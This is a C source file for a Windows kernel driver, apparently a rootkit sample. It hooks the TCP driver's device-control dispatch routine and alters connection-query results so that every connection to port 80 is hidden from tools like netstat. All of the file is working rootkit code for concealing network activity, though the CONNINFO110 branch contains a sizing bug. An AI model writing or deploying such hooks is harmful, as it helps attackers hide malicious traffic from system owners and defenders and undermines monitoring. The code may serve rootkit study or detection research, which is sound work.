#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>

#include <windef.h>

/*
*	Code to modify IRPs from one driver table already present
*	in the system, so it is possible to manage the requests
*	from some programs to those drivers. 
*	On this case we will hook the use of TCP driver, used 
*	by some programs to use TCP connections.
*/

PFILE_OBJECT	pFile_tcp;
PDEVICE_OBJECT	pDev_tcp;
PDRIVER_OBJECT	pDrv_tcpip;

// TDIObjectID TCP 
#define CO_TL_ENTITY					0x400
// TDIObjectID UDP
#define CL_TL_ENTITY					0x401
// IoControlCode value for the IRP
#define IOCTL_TCP_QUERY_INFORMATION_EX	0x00120003

#define CONNINFO101_k					0x101
#define CONNINFO102_k					0x102
#define CONNINFO110_k					0x110

#define HTTP_PORT						80

// Function to get a PORT
#define HTONS(a) ( ((0xFF & a) << 8) + ((0xFF & a) >> 8))


// structure of an entity ID
typedef struct _TDIEntityID
{
	ULONG			tei_entity;
	ULONG			tei_instance;
} TDIEntityID, *PTDIEntityID;

typedef struct  _TDIObjectID
{
	TDIEntityID		toi_entity;
	ULONG			toi_class;
	ULONG			toi_type;
	ULONG			toi_id;
} TDIObjectID, *PTDIObjectID;

/*
*	Define of the mmethod to hook,it will be a function
*	to manage an IRP request  to DeviceIoControl, so
*	as parameters we will have a DEVICE_OBJECT and a
*	pointer to IRP
*/
typedef NTSTATUS(*OLDIRPMJDEVICECONTROL) (
	IN PDEVICE_OBJECT,
	IN PIRP
	);

/*
*	Buffer structures for TCP information returned by TCP.SYS
*	depends of the flag of ntstat
*/
typedef struct _CONNINFO101
{
	ULONG	status;
	ULONG	src_addr;
	USHORT	src_port;
	USHORT	unk1;
	ULONG	dst_addr;
	USHORT	dst_port;
	USHORT	unk2;
} CONNINFO101, *PCONNINFO101;

typedef struct _CONNINFO102
{
	ULONG	status;
	ULONG	src_addr;
	USHORT	src_port;
	USHORT	unk1;
	ULONG	dst_addr;
	USHORT	dst_port;
	USHORT	unk2;
	ULONG	pid;
} CONNINFO102, *PCONNINFO102;

typedef struct _CONNINFO110
{
	ULONG	size;
	ULONG	status;
	ULONG	src_addr;
	USHORT	src_port;
	USHORT	unk1;
	ULONG	dst_addr;
	USHORT	dst_port;
	USHORT	unk2;
	ULONG	pid;
	PVOID	unk3[35];
} CONNINFO110, *PCONNINFO110;

/*
*	Parameters we will give to the function to complete the IRP
*	we will have a pointer to the previous function.
*/
typedef	struct _REQINFO
{
	PIO_COMPLETION_ROUTINE	OldCompletion;
	ULONG					ReqType;
} REQINFO, *PREQINFO;


// to save the previous pointer/handler
OLDIRPMJDEVICECONTROL OldIrpMjDeviceControl;

// Functions
NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS InstallTCPDriverHook();
NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath);
NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context);
NTSTATUS Unload(IN PDRIVER_OBJECT DriverObject);

DRIVER_INITIALIZE DriverEntry;

/*
*	Method to install a HOOK in a Driver IRP
*/
NTSTATUS InstallTCPDriverHook()
{
	NTSTATUS ntStatus;
	UNICODE_STRING deviceTCPUnicodeString; // It is necessary to use UNICODE_STRING to use
										   // the functions which will give us driver handle
	WCHAR deviceTCPNameBuffer[] = L"\\Device\\Tcp"; // driver object name
	// start global variables
	pFile_tcp	= NULL;
	pDev_tcp	= NULL;
	pDrv_tcpip	= NULL;

	// Init String UNICODE
	RtlInitUnicodeString(&deviceTCPUnicodeString, deviceTCPNameBuffer);

	/*
	*	IoGetDeviceObjectPointer give us a handler for the given name
	*	driver, with this we will be able to modify the IRP handler.
	*/
	ntStatus = IoGetDeviceObjectPointer(&deviceTCPUnicodeString, FILE_READ_DATA, &pFile_tcp, &pDev_tcp);

	if (!NT_SUCCESS(ntStatus))
		return ntStatus;

	// get driver object, from the device object
	pDrv_tcpip = pDev_tcp->DriverObject;

	/*
	*	Once we have the driver object, we can access
	*	to its IRP handlers, we save the old dispatcher
	*	from the IRP IRP_MJ_DEVICE_CONTROL
	*/
	OldIrpMjDeviceControl = pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL];

	/*
	*	If everything was correct, we use InterlockedExchange to modify
	*	this IRP handler in an atomic way
	*/
	if (OldIrpMjDeviceControl)
	{
		InterlockedExchange((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)HookedDeviceControl);
	}

	return STATUS_SUCCESS;
}

/*
*	Hook for the IRP, we will filtrate the necessary calls
*	and finally we will return the control to the next
*	IRP Stack handler
*/
NTSTATUS HookedDeviceControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION				irpStack; // it is necessary to know where the IRP Stack is
											  // here is where we will find the function codes
											  // for the major and minor IRPs
	ULONG							ioTransferType;
	PTDIObjectID					inputBuffer;
	DWORD							context;

	// get a pointer to current IRP Stack location,
	// here we will find the function codes and the
	// parameters
	irpStack = IoGetCurrentIrpStackLocation(Irp);

	switch (irpStack->MajorFunction)
	{
	case IRP_MJ_DEVICE_CONTROL:
		// get the control code from DeviceIoControl parameters
		ioTransferType = irpStack->Parameters.DeviceIoControl.IoControlCode;
		if (ioTransferType & METHOD_NEITHER) // to check method Type3 (METHOD_NEITHER)
		{
			inputBuffer = (PTDIObjectID)irpStack->Parameters.DeviceIoControl.Type3InputBuffer;

			/*
			*	CO_TL_ENTITY ====> TCP
			*	CL_TL_ENTITY ====> UDP
			*
			*	We will look for TCP
			*/
			if (inputBuffer->toi_entity.tei_entity == CO_TL_ENTITY)
			{
				if (
					(inputBuffer->toi_id == CONNINFO101_k) ||
					(inputBuffer->toi_id == CONNINFO102_k) ||
					(inputBuffer->toi_id == CONNINFO110_k)
					)
				{
					/*
					*	Call our completion routine if the IRP went well
					*	to do this, just change control flag from the IRP
					*/
					irpStack->Control &= 0;
					irpStack->Control |= SL_INVOKE_ON_SUCCESS;

					// Allocate memory for the context parameter of the
					// completion routine for the IRP
					irpStack->Context = (PIO_COMPLETION_ROUTINE)ExAllocatePool(NonPagedPool, sizeof(REQINFO));
					// Save the current completion routine as OldCompletion
					((PREQINFO)irpStack->Context)->OldCompletion = irpStack->CompletionRoutine;
					((PREQINFO)irpStack->Context)->ReqType = inputBuffer->toi_id;
					/*
					*	Set new function to be called after finishing the IRP
					*/
					irpStack->CompletionRoutine = (PIO_COMPLETION_ROUTINE)IoCompletionRoutine;
				}
			}
		}
	default:
		break;
	}

	return OldIrpMjDeviceControl(DeviceObject, Irp);
}

/*
*	Function to finish the management of the IRP.
*/
NTSTATUS IoCompletionRoutine(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PVOID OutputBuffer;
	DWORD NumOutputBuffers;
	PIO_COMPLETION_ROUTINE p_compRoutine;
	SIZE_T i;

	/*
	*	Connection status values:
	*
	* 0 = Invisible
	* 1 = CLOSED
	* 2 = LISTENING
	* 3 = SYN_SENT
	* 4 = SYN_RECEIVED
	* 5 = ESTABLISHED
	* 6 = FIN_WAIT_1
	* 7 = FIN_WAIT_2
	* 8 = CLOSE_WAIT
	* 9 = CLOSING
	* ...
	*/
	OutputBuffer = Irp->UserBuffer;
	p_compRoutine = ((PREQINFO)Context)->OldCompletion;

	// Now send to hell all connection to port 80
	if (((PREQINFO)Context)->ReqType == CONNINFO101_k)
	{
		// get the number of CONNINFO101 structs
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO101);

		for (i = 0; i < NumOutputBuffers; i++)
		{
			// hide all the http connections
			if (HTONS(((PCONNINFO101)OutputBuffer)[i].dst_port) == HTTP_PORT)
				((PCONNINFO101)OutputBuffer)[i].status = NULL;
		}
	}

	else if (((PREQINFO)Context)->ReqType == CONNINFO102_k)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);

		for (i = 0; i < NumOutputBuffers; i++)
		{
			// hide all the http connections
			if (HTONS(((PCONNINFO102)OutputBuffer)[i].dst_port) == 80)
				((PCONNINFO102)OutputBuffer)[i].status = NULL;
		}
	}

	else if (((PREQINFO)Context)->ReqType == CONNINFO110_k)
	{
		NumOutputBuffers = Irp->IoStatus.Information / sizeof(CONNINFO102);

		for (i = 0; i < NumOutputBuffers; i++)
		{
			// hide all the http connections
			if (HTONS(((PCONNINFO110)OutputBuffer)[i].dst_port) == 80)
				((PCONNINFO110)OutputBuffer)[i].status = NULL;
		}
	}

	// Free context memory
	ExFreePool(Context);

	if ((Irp->StackCount > (ULONG)1) && (p_compRoutine != NULL))
	{
		return (p_compRoutine)(DeviceObject, Irp, NULL);
	}
	else
	{
		return Irp->IoStatus.Status;
	}
}

NTSTATUS Unload(IN PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);

	if (OldIrpMjDeviceControl)
		InterlockedExchange((PLONG)&pDrv_tcpip->MajorFunction[IRP_MJ_DEVICE_CONTROL], (LONG)OldIrpMjDeviceControl);
	if (pFile_tcp != NULL)
		ObDereferenceObject(pFile_tcp);

	pFile_tcp = NULL;

	DbgPrint("\n%s\n", "Unloading Driver...");
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath
)
{
	NTSTATUS			ntStatus;

	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("\n%s\n", "Started Driver...");

	OldIrpMjDeviceControl = NULL;

	DriverObject->DriverUnload = Unload;

	ntStatus = InstallTCPDriverHook();
	if (!NT_SUCCESS(ntStatus))
		return ntStatus;

	return STATUS_SUCCESS;
}

